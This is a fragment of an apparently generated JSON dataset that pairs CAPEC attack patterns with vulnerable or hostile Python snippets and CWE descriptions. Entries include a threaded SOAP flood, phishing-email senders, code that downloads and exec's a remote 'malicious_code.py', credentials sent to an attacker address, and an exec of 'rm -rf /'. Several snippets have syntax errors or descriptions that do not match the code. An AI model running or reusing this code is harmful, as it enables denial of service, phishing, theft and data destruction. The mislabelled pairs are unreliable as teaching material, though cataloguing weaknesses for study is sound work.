        "description": "This code snippet demonstrates a cache poisoning attack. The 'get_data' function retrieves data from a URL and stores it in a cache. The 'update_cache' function allows an attacker to update the cache with malicious data. The attacker updates the cache with malicious data for a legitimate URL, and then the victim's request to the same URL retrieves the malicious data from the cache. This code embodies CWE-348 (Use of Less Trusted Source), CWE-345 (Insufficient Verification of Data Authenticity), CWE-349 (Acceptance of Extraneous Untrusted Data With Trusted Data), CWE-346 (Origin Validation Error), and CWE-524 (Use of Cache Containing Sensitive Information)."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import dns.resolver\n\ndef resolve_domain(domain):\n    try:\n        answers = dns.resolver.resolve(domain, 'A')\n        for rdata in answers:\n            return str(rdata)\n    except dns.resolver.NoAnswer:\n        return None\n\ndef main():\n    domain = 'www.example.com'\n    ip_address = resolve_domain(domain)\n    if ip_address:\n        # Perform security-critical action based on unverified DNS resolution\n        print(f'Access granted to {domain} with IP address {ip_address}')\n    else:\n        print(f'Failed to resolve {domain}')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a vulnerable DNS resolution implementation that embodies the main idea of the CAPEC. It uses the `dns.resolver` module to resolve a domain name to an IP address without properly verifying the authenticity of the DNS response. The `resolve_domain` function returns the first IP address it receives from the DNS cache without checking its origin or validity. The `main` function then uses this unverified IP address to make a security-critical decision, which can be exploited by an adversary who has modified the public DNS cache. This code snippet relates to CWEs 348, 345, 349, 346, and 350."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "import os\n\n# CWE-219: Storage of File with Sensitive Data Under Web Root\nsensitive_data_file = 'sensitive_data.txt'\nweb_root = '/var/www/html'\n\n# Storing sensitive data under web root with insufficient access control\nos.makedirs(web_root, exist_ok=True)\nos.chmod(web_root, 0o755)\nwith open(os.path.join(web_root, sensitive_data_file), 'w') as f:\n    f.write('Top Secret Information')\n\n# CWE-494: Download of Code Without Integrity Check\nimport requests\n\n# Downloading code from a remote location without verifying origin and integrity\nurl = 'https://example.com/malicious_code.py'\nresponse = requests.get(url)\nwith open('malicious_code.py', 'wb') as f:\n    f.write(response.content)\n\n# Executing the downloaded code without sufficient verification\nexec(compile(open('malicious_code.py').read(), 'malicious_code.py', 'exec'))\n\n# CWE-612: Improper Authorization of Index Containing Sensitive Information\nimport whoosh\nfrom whoosh.fields import Schema, TEXT, ID\n\n# Creating a search index of private or sensitive documents without proper access control\nschema = Schema(title=TEXT(stored=True), path=ID(stored=True))\nindex = whoosh.index.create_in('indexdir', schema)\nwriter = index.writer()\nwriter.add_document(title='Top Secret Document', path='/path/to/top/secret/document')\nwriter.commit()\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nimport git\n\n# Storing a Git repository in a directory accessible to unauthorized actors\ngit.Repo.init('repo', mkdir=True)\n",
        "description": "This code snippet demonstrates the CAPEC of an adversary searching a targeted web site for web pages that have not been publicized. It includes vulnerabilities such as storing sensitive data under the web root with insufficient access control (CWE-219), downloading code without integrity check (CWE-494), improper authorization of index containing sensitive information (CWE-612), and exposure of version-control repository to an unauthorized control sphere (CWE-527)."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "import os\nimport requests\nimport xml.etree.ElementTree as ET\n\n# CWE-651: Exposure of WSDL File Containing Sensitive Information\nwsdl_url = 'http://example.com/webservice?wsdl'\nresponse = requests.get(wsdl_url)\nif response.status_code == 200:\n    root = ET.fromstring(response.content)\n    for service in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}service'):\n        service_name = service.find('{http://schemas.xmlsoap.org/wsdl/}port').attrib['binding']\n        print(f'Found unpublished service: {service_name}')\n\n# CWE-425: Direct Request ('Forced Browsing')\nforbidden_url = 'http://example.com/admin'\nresponse = requests.get(forbidden_url)\nif response.status_code == 200:\n    print(f'Found unrestricted access to {forbidden_url}')\n\n# CWE-494: Download of Code Without Integrity Check\ncode_url = 'http://example.com/download/code.py'\nresponse = requests.get(code_url)\nif response.status_code == 200:\n    with open('code.py', 'wb') as f:\n        f.write(response.content)\n    os.system('python code.py')\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo_url = 'http://example.com/.git'\nresponse = requests.get(repo_url)\nif response.status_code == 200:\n    print(f'Found exposed version control repository: {repo_url}')\n\n# CWE-223: Omission of Security-relevant Information\nlog_file = 'security_log.txt'\nwith open(log_file, 'a') as f:\n    f.write('No security information recorded.\\n')",
        "description": "Python code snippet that demonstrates the CAPEC of searching a targeted web site for web services that have not been publicized, using related CWEs for additional context. The code searches for exposed WSDL files, unrestricted access to forbidden URLs, downloadable code without integrity checks, exposed version control repositories, and omission of security-relevant information."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "import hashlib\n\ndef send_message(message, checksum):\n    # CWE-354: Improper Validation of Integrity Check Value\n    # CWE-328: Use of Weak Hash\n    weak_hash = hashlib.md5(message.encode()).hexdigest()\n    return {'message': message, 'checksum': weak_hash}\n\n\ndef receive_message(data):\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    message = data['message']\n    checksum = data['checksum']\n    # CWE-353: Missing Support for Integrity Check\n    # CWE-1283: Mutable Attestation or Measurement Reporting Data\n    # Adversary modifies the message body and checksum\n    modified_message = 'Modified ' + message\n    modified_checksum = hashlib.md5(modified_message.encode()).hexdigest()\n    return {'message': modified_message, 'checksum': modified_checksum}\n\n# Example usage\noriginal_message = 'Hello, World!'\noriginal_data = send_message(original_message, '')\nprint('Original Data:', original_data)\n\nmodified_data = receive_message(original_data)\nprint('Modified Data:', modified_data)",
        "description": "This code snippet demonstrates the CAPEC of checksum spoofing. The `send_message` function generates a weak MD5 checksum for a given message. The `receive_message` function receives the message and checksum, but instead of validating the integrity of the message, it modifies the message body and updates the checksum accordingly. This allows an adversary to spoof the checksum and make the modified message appear valid."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_string):\n    root = ET.fromstring(xml_string)\n    schema_location = root.attrib.get('{http://www.w3.org/2001/XMLSchema-instance}schemaLocation')\n    if schema_location:\n        # CWE-15: External Control of System or Configuration Setting\n        # CWE-472: External Control of Assumed-Immutable Web Parameter\n        schema_url = schema_location.split()[0]\n        # CWE-112: Missing XML Validation\n        # CWE-91: XML Injection (aka Blind XPath Injection)\n        # CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')\n        # No validation or sanitization of the schema URL\n        import requests\n        schema_response = requests.get(schema_url)\n        if schema_response.status_code == 200:\n            schema_xml = schema_response.text\n            # Process the XML using the untrusted schema\n            # ...",
        "description": "This Python code snippet demonstrates the CAPEC of schema poisoning by allowing an attacker to control the XML schema used for processing. The code retrieves the schema location from the XML string, downloads the schema from the specified URL, and uses it to process the XML without any validation or sanitization. This allows an attacker to manipulate the schema and compromise the security of the system."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport requests\nimport threading\n\n\ndef send_soap_request():\n    root = ET.Element('soap:Envelope')\n    ET.SubElement(root, 'soap:Body')\n    tree = ET.ElementTree(root)\n    soap_xml = ET.tostring(root, encoding='unicode')\n    while True:\n        requests.post('http://target.com/soap_endpoint', data=soap_xml, headers={'Content-Type': 'text/xml; charset=utf-8'})\n\nthreads = []\nfor i in range(1000):\n    t = threading.Thread(target=send_soap_request)\n    threads.append(t)\n    t.start()",
        "description": "This Python code snippet demonstrates a resource depletion attack by sending a large number of SOAP requests to a target system. The SOAP requests are generated without proper XML validation (CWE-112) and are sent in cleartext (CWE-319), which can be sniffed by unauthorized actors. The code uses multiple threads to send requests rapidly, without controlling the allocation of resources (CWE-400, CWE-770), leading to potential resource exhaustion on the target system. The destination of the requests is not correctly specified (CWE-941), making it difficult to track the source of the attack."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "import requests\n\n# CWE-345: Insufficient Verification of Data Authenticity\nurl = 'https://example.com'\nresponse = requests.get(url, verify=False)\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\nif response.status_code == 200:\n    content = response.content\n    # CWE-433: Unparsed Raw Web Content Delivery\n    with open('spoofed_content.html', 'wb') as f:\n        f.write(content)\n\n    # CWE-352: Cross-Site Request Forgery (CSRF)\n    csrf_token = 'fake_csrf_token'\n    headers = {'X-CSRFToken': csrf_token}\n    requests.post(url, headers=headers, data={'spoofed_data': 'malicious_content'})\n\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    redirect_url = 'https://attacker.com'\n    response = requests.get(url, allow_redirects=True, params={'redirect': redirect_url})",
        "description": "This Python code snippet demonstrates content spoofing by modifying the content of a web page. It first sends an unverified request to a URL, then saves the response content to a file. The code then sends a POST request with a fake CSRF token to the same URL, and finally, it sends a GET request with an incorrect redirect parameter, allowing an attacker to redirect the user to a malicious site."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-73: External Control of File Name or Path\nfilename = input('Enter a filename: ')\n\n# CWE-377: Insecure Temporary File\n# CWE-378: Creation of Temporary File With Insecure Permissions\n# CWE-379: Creation of Temporary File in Directory with Insecure Permissions\n# CWE-41: Improper Resolution of Path Equivalence\n\n# Predictable temporary file name and location\npredictable_temp_file = '/tmp/' + filename + '.tmp'\n\n# Create a temporary file with insecure permissions\nos.chmod(predictable_temp_file, 0o666)\n\n# Perform some operation on the temporary file\nwith open(predictable_temp_file, 'w') as f:\n    f.write('Some sensitive data')\n\n# CWE-41: Improper Resolution of Path Equivalence\n# Using special characters in file and directory names\npredictable_temp_file_equivalent = '/../' + filename + '.tmp'\n\n# Create a temporary file in a directory with insecure permissions\nos.makedirs(os.path.dirname(predictable_temp_file_equivalent), 0o777)\n\n# Create the temporary file\nwith open(predictable_temp_file_equivalent, 'w') as f:\n    f.write('Some sensitive data')",
        "description": "This code snippet demonstrates the creation of predictable temporary files with insecure permissions, allowing an attacker to potentially exploit the system. The code uses user input to control the file name, which can lead to path equivalence issues. The temporary files are created in directories with insecure permissions, making them vulnerable to unauthorized access."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "import os\n\n# CWE-552: Files or Directories Accessible to External Parties\nconfig_file_path = '/etc/config.txt'\nif os.access(config_file_path, os.R_OK):\n    with open(config_file_path, 'r') as f:\n        config_data = f.read()\n        print('Config data:', config_data)\n\n# CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\ndebug_info_path = '/debug/debug_info.txt'\nif os.path.exists(debug_info_path):\n    with open(debug_info_path, 'r') as f:\n        debug_info = f.read()\n        print('Debug info:', debug_info)\n\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\ndecommissioned_device_path = '/decommissioned/device_data.txt'\nif os.path.exists(decommissioned_device_path):\n    with open(decommissioned_device_path, 'r') as f:\n        device_data = f.read()\n        print('Device data:', device_data)\n\n# CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\npower_transition_path = '/power_transition/sensitive_info.txt'\nif os.path.exists(power_transition_path):\n    with open(power_transition_path, 'r') as f:\n        sensitive_info = f.read()\n        print('Sensitive info:', sensitive_info)\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data_path = '/trace_data/trace_log.txt'\nif os.path.exists(trace_data_path):\n    with open(trace_data_path, 'r') as f:\n        trace_log = f.read()\n        print('Trace log:', trace_log)\n\n# CWE-1330: Remanent Data Readable after Memory Erase\nmemory_erase_path = '/memory_erase/remanent_data.txt'\nif os.path.exists(memory_erase_path):\n    with open(memory_erase_path, 'r') as f:\n        remanent_data = f.read()\n        print('Remanent data:', remanent_data)",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting well-known locations for resources to undermine security. It includes examples of CWEs 552, 1258, 1266, 1272, 1323, and 1330, showcasing how an adversary can access sensitive information due to improper management of files, directories, and system resources."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "import socket\n\nclass AuthenticationServer:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(5)\n\n    def authenticate(self, client_socket):\n        # CWE-287: Improper Authentication\n        # CWE-290: Authentication Bypass by Spoofing\n        # CWE-1390: Weak Authentication\n        username = client_socket.recv(1024).decode('utf-8')\n        password = client_socket.recv(1024).decode('utf-8')\n        if username == 'admin' and password == 'password':\n            return True\n        else:\n            return False\n\n    def start(self):\n        while True:\n            client_socket, address = self.server_socket.accept()\n            if self.authenticate(client_socket):\n                # CWE-322: Key Exchange without Entity Authentication\n                # CWE-302: Authentication Bypass by Assumed-Immutable Data\n                print('Authenticated!')\n                client_socket.send('Authenticated!'.encode('utf-8'))\n            else:\n                print('Authentication failed!')\n                client_socket.send('Authentication failed!'.encode('utf-8'))\n\nif __name__ == '__main__':\n    server = AuthenticationServer('localhost', 8080)\n    server.start()",
        "description": "This code snippet demonstrates a vulnerable authentication server that is susceptible to identity spoofing attacks. The server does not properly authenticate clients, allowing an attacker to spoof their identity and gain unauthorized access. The code highlights CWE-287, CWE-290, CWE-1390, CWE-322, and CWE-302 weaknesses."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "def process_input(user_input):\n    # CWE-20: No input validation\n    # CWE-1286: No validation of syntactic correctness\n    # CWE-1287: No validation of specified type of input\n    # CWE-807: Reliance on untrusted inputs in a security decision\n    # CWE-1173: Improper use of validation framework\n    if user_input == 'admin':\n        return 'Access granted'\n    else:\n        return 'Access denied'\n\nuser_input = input('Enter your username: ')\nprint(process_input(user_input))",
        "description": "This code snippet demonstrates a vulnerable input processing interface. It receives user input without validating its format, structure, or composition, making it susceptible to attacks. The function process_input() relies on the untrusted user input to make a security decision, which can be bypassed by an attacker. The code lacks proper input validation, syntactic correctness checks, and type validation, making it vulnerable to various attacks."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "import requests\n\n# CWE-451: Misrepresenting critical information to the user\nurl = input('Enter the URL: ')  # User is tricked into entering a malicious URL\n\n# CWE-941: Incorrectly specified destination in a communication channel\nresponse = requests.get(url, verify=False)  # SSL verification is disabled, allowing the adversary to spoof the location\n\n# CWE-290: Authentication bypass by spoofing\nif response.status_code == 200:\n    # CWE-940: Improper verification of source of a communication channel\n    print('Authentication successful!')  # Authentication is bypassed, and the adversary can access the system\n\n    # CWE-923: Improper restriction of communication channel to intended endpoints\n    # The adversary can now access the system and perform privileged operations\n    privileged_operation()",
        "description": "This code snippet demonstrates the CAPEC of deceiving an application or user into requesting a resource from an unintended location. The user is tricked into entering a malicious URL, which is then used to make an unverified request to the adversary's controlled resource. The adversary can then spoof the location, bypass authentication, and access the system to perform privileged operations."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-378: Creation of Temporary File With Insecure Permissions\n# CWE-379: Creation of Temporary File in Directory with Insecure Permissions\n\ndef process_sensitive_data(data):\n    # Create a temporary file in a directory with insecure permissions\n    temp_dir = '/tmp'\n    temp_file = tempfile.NamedTemporaryFile(mode='w', dir=temp_dir, delete=False)\n    temp_file.write(data)\n    temp_file.close()\n\n    # CWE-524: Use of Cache Containing Sensitive Information\n    # Cache the sensitive data in a web cache\n    cache_dir = '/var/cache/web'\n    cache_file = os.path.join(cache_dir, 'sensitive_data.cache')\n    with open(cache_file, 'w') as f:\n        f.write(data)\n\n    # CWE-219: Storage of File with Sensitive Data Under Web Root\n    # Store the sensitive data under the web document root\n    web_root = '/var/www/html'\n    sensitive_file = os.path.join(web_root, 'sensitive_data.txt')\n    with open(sensitive_file, 'w') as f:\n        f.write(data)\n\n# Example usage\nprocess_sensitive_data('Top Secret Information')",
        "description": "This code snippet demonstrates the CAPEC of exploiting temporary, insecure storage of information. It creates a temporary file in a directory with insecure permissions, caches sensitive data in a web cache, and stores the sensitive data under the web document root. This code is vulnerable to attacks that can recover sensitive information from temporary files, caches, and web storage."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "import socket\n\ndef send_unencrypted_data():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('example.com', 8080))\n    data = {'username': 'admin', 'password': 'password123'}\n    s.sendall(str(data).encode())\n    s.close()\n\nsend_unencrypted_data()",
        "description": "This Python code snippet demonstrates a vulnerable code that sends sensitive data (username and password) in cleartext over a network connection, making it susceptible to sniffing attacks. The code does not encrypt the data before transmission, violating CWE-311 and CWE-319. An adversary can intercept the communication and read the sensitive information."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "import socket\n\ndef send_unencrypted_data():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('example.com', 8080))\n    data = {'username': 'admin', 'password': 'password123'}\n    s.sendall(str(data).encode())\n    s.close()\n\n\ndef send_sensitive_info_in_cleartext():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('example.com', 8080))\n    data = 'username=admin&password=password123'\n    s.sendall(data.encode())\n    s.close()\n\n\ndef replay_authentication():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('example.com', 8080))\n    captured_data = b'username=admin&password=password123'\n    s.sendall(captured_data)\n    s.close()\n\n\ndef expose_system_info():\n    import os\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('example.com', 8080))\n    system_info = os.system('systeminfo')\n    s.sendall(str(system_info).encode())\n    s.close()\n",
        "description": "This code snippet demonstrates the CAPEC of network sniffing, where an adversary can capture sensitive information at the protocol level. The code includes functions that send unencrypted data, send sensitive information in cleartext, replay authentication, and expose system information, all of which are vulnerable to network sniffing attacks."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "import os\n\n# CWE-426: Untrusted Search Path\nos.environ['PATH'] = '/tmp/adversarycontrolledpath:' + os.environ['PATH']\n\n# CWE-73: External Control of File Name or Path\nlibrary_path = input('Enter the path to the library: ')\n\n# CWE-706: Use of Incorrectly-Resolved Name or Reference\ntry:\n    lib = __import__(library_path)\n    lib.function()\nexcept ImportError:\n    print('Library not found')\n\n# CWE-427: Uncontrolled Search Path Element\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n# (not explicitly shown, but could occur if the imported library calls other libraries)\n",
        "description": "This Python code snippet demonstrates the CAPEC pattern of exploiting weaknesses in the way an application searches for external libraries. The code sets an untrusted search path, allows external control of the library path, and uses an incorrectly-resolved name or reference to import the library. This can lead to the execution of arbitrary code if an adversary supplies a malicious library."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/execute_script', methods=['POST'])\ndef execute_script():\n    script = request.form['script']\n    exec(script)\n    return 'Script executed successfully'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable API that takes scripted instructions as input and executes them using the exec function. This allows an attacker to specify the script that serves as input, potentially gaining access to a great deal of functionality and compromising the application. The code is vulnerable to CWE-79 (Cross-site Scripting), CWE-81 (Improper Neutralization of Script in an Error Message Web Page), CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine), CWE-346 (Origin Validation Error), and CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax)."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import socket\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\n# Attacker-controlled DNS server that resolves bank.com to attacker's IP\nbank_ip = 'attacker_ip'\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\n# Create a socket to the attacker's server\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((bank_ip, 80))\n\n# Send fake login credentials to the attacker's server\nsock.send(b'username=password')\n\n# CWE-1292: Incorrect Conversion of Security Identifiers\n# Convert security identifiers incorrectly to gain unauthorized access\nsecurity_id = 'incorrectly_converted_id'\n\n# Send the incorrectly converted security identifier to the attacker's server\nsock.send(security_id.encode())\n",
        "description": "This code snippet demonstrates a phishing attack where an attacker exploits the infrastructure of a network entity to redirect a user's connection to a fake bank website. The attacker controls a DNS server that resolves bank.com to the attacker's IP, and the user's login credentials are sent to the attacker's server instead of the actual bank's server. The code also includes vulnerabilities related to improper restriction of communication channels, incorrect conversion of security identifiers, and exposure of sensitive system information."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "```\n# Server-side code (vulnerable)\nfrom flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/purchase', methods=['POST'])\ndef purchase_item():\n    item_price = request.form['price']\n    quantity = request.form['quantity']\n    total_cost = float(item_price) * int(quantity)\n    # Process payment and update inventory\n    return 'Transaction successful!'\n\nif __name__ == '__main__':\n    app.run()\n```\n",
        "description": "This code snippet demonstrates a vulnerable server-side implementation that relies on client-side input for pricing information. The 'price' and 'quantity' fields are retrieved from the client-side form submission and used to calculate the total cost without any validation or verification. An adversary can exploit this by modifying the hidden form fields on the client-side to manipulate the pricing information, allowing them to acquire items at a lower cost than intended."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "import smtplib\n\n\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\n\n\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n\n\n# Create a phishing email that appears to come from a trusted entity\nmsg = MIMEMultipart()\nmsg['From'] = 'trusted_entity@example.com'\nmsg['To'] = 'target@example.com'\nmsg['Subject'] = 'Urgent: Update Your Account Information'\n\n\nbody = \"Dear valued customer,\\n\\nWe have reason to believe that your account has been compromised. Please click on the following link to update your information: \\n\" + \n\"<http://untrusted-site.com/update_account?redirect=http://example.com>&\" + \n\"<http://untrusted-site.com/update_account?redirect=http://example.com>\"\n\n\nmsg.attach(MIMEText(body, 'plain'))\n\n\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n# CWE-1022: Use of Web Link to Untrusted Target with window.opener Access\n\n\n# Send the phishing email\nserver = smtplib.SMTP('smtp.example.com')\nserver.sendmail('trusted_entity@example.com', 'target@example.com', msg.as_string())\nserver.quit()",
        "description": "This Python code snippet demonstrates a spear phishing attack (CAPEC-98) by sending a targeted email to a specific user, appearing to come from a trusted entity. The email contains a link to an untrusted site, which can lead to a phishing attack. The code exploits multiple CWEs, including CWE-451 (User Interface Misrepresentation of Critical Information), CWE-601 (URL Redirection to Untrusted Site), CWE-301 (Reflection Attack in an Authentication Protocol), CWE-942 (Permissive Cross-domain Policy with Untrusted Domains), and CWE-1022 (Use of Web Link to Untrusted Target with window.opener Access)."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import smtplib\n\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\nphishing_message = 'Your account has been compromised! Click this link to reset your password: http://malicious-website.com/reset_password'\n\n# CWE-290: Authentication Bypass by Spoofing\nsender_email = 'support@legitimate-bank.com'\nreceiver_email = 'victim@example.com'\nsubject = 'Urgent: Reset Your Password'\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\nattempts = 0\nwhile attempts < 10:\n    try:\n        server = smtplib.SMTP('smtp.gmail.com', 587)\n        server.starttls()\n        server.login(sender_email, 'password')\n        server.sendmail(sender_email, receiver_email, subject, phishing_message)\n        print('Phishing email sent successfully!')\n        break\n    except smtplib.SMTPAuthenticationError:\n        attempts += 1\n        print('Authentication failed. Trying again...')\n\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-308: Use of Single-factor Authentication\npassword = input('Enter your password: ')\nif password == 'weak_password':\n    print('Login successful!')\nelse:\n    print('Invalid password. Try again.')",
        "description": "This Python code snippet demonstrates a mobile phishing attack, where an adversary sends a phishing SMS to a victim, enticing them to reset their password on a malicious website. The code uses a spoofed email address to send the phishing message, bypassing authentication. It also allows for multiple failed authentication attempts and uses a weak password system for primary authentication, making it vulnerable to brute force attacks."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    if os.path.isfile(file_path):\n        with open(file_path, 'r') as f:\n            content = f.read()\n            # Vulnerable code: using user-provided file name to determine processing behavior\n            if file_path.endswith('.txt'):\n                print('Processing text file...')\n            elif file_path.endswith('.jpg'):\n                print('Processing image file...')\n            else:\n                print('Unknown file type...')\n    else:\n        print('File not found...')\n\n# CWE-73: External Control of File Name or Path\nfile_path = input('Enter file path: ')\nprocess_file(file_path)\n\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\nuploaded_file = {'filename': 'malicious.txt', 'content': 'evil code'}\nprocess_file(uploaded_file['filename'])\n\n# CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\nresource_id = input('Enter resource ID: ')\nprocess_file(resource_id + '.txt')\n\n# CWE-377: Insecure Temporary File\nimport tempfile\ntemp_file = tempfile.NamedTemporaryFile(suffix='.txt')\nprocess_file(temp_file.name)\n\n# CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nrestricted_dir = '/restricted/'\nuser_input = input('Enter file name: ')\nfile_path = restricted_dir + user_input\nprocess_file(file_path)",
        "description": "This Python code snippet demonstrates the CAPEC of File Manipulation attacks, which involves modifying file contents or attributes to cause incorrect processing by an application. The code includes vulnerabilities related to CWE-73, CWE-646, CWE-99, CWE-377, and CWE-22, showcasing how an attacker can manipulate file names, extensions, and paths to cause the application to enter unstable states or execute arbitrary code."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "import os\n\nclass PowerSaveRestore:\n    def __init__(self):\n        self.config_state = {'security_settings': None}\n\n    def save_state(self):\n        # CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n        # No verification of config_state integrity before saving\n        os.popen('echo \"saving state...\" > /sys/power/state')\n\n    def restore_state(self):\n        # CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings\n        # Security-critical logic not set to a known value on reset\n        self.config_state['security_settings'] = None\n        os.popen('echo \"restoring state...\" > /sys/power/state')\n\n    def reset_config(self):\n        # CWE-306: Missing Authentication for Critical Function\n        # No authentication for critical function\n        self.config_state = {'security_settings': None}\n        os.popen('echo \"resetting config...\" > /sys/power/state')\n\n    def set_lock_bit(self):\n        # CWE-1232: Improper Lock Behavior After Power State Transition\n        # Register lock bit protection not maintained after power state transition\n        self.config_state['lock_bit'] = False\n        os.popen('echo \"setting lock bit...\" > /sys/power/state')\n\n    def set_register_defaults(self):\n        # CWE-1221: Incorrect Register Defaults or Module Parameters\n        # Incorrectly defining register defaults to insecure values\n        self.config_state['register_defaults'] = {'insecure_value': True}\n        os.popen('echo \"setting register defaults...\" > /sys/power/state')\n",
        "description": "This code snippet demonstrates the CAPEC of forcing a target into a previous state to leverage potential weaknesses. It includes CWEs related to missing authentication, incorrect register defaults, improper lock behavior, uninitialized values on reset, and improperly preserved integrity of hardware configuration state during power save/restore operations."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "import dis\nimport os\nimport sys\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.uname()\nprint(sensitive_info)\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = open('/sys/kernel/debug/tracing/trace', 'r').read()\nprint(trace_data)\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = '__import__(\"os\").system(\"rm -rf /\")'\nexec(malicious_code)\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nsecurity_critical_code = 'if __debug__:\n    print(\"Security check failed\")'\nexec(security_critical_code)\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\nif os.environ.get('DEBUG_MODE') == '1':\n    # Activate debug logic\n    print('Debug mode activated')\n\n# White box analysis\ndef analyze_software():\n    with open(sys.argv[0], 'rb') as f:\n        bytecode = f.read()\n    dis.dis(bytecode)\n\nanalyze_software()",
        "description": "This Python code snippet demonstrates the CAPEC of white box analysis, where an attacker analyzes the software's machine instructions to discover its structure, function, and composition. The code includes examples of related CWEs, including exposure of sensitive system information, improper management of sensitive trace data, embedded malicious code, processor optimization removal or modification of security-critical code, and hardware allowing activation of test or debug logic at runtime."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
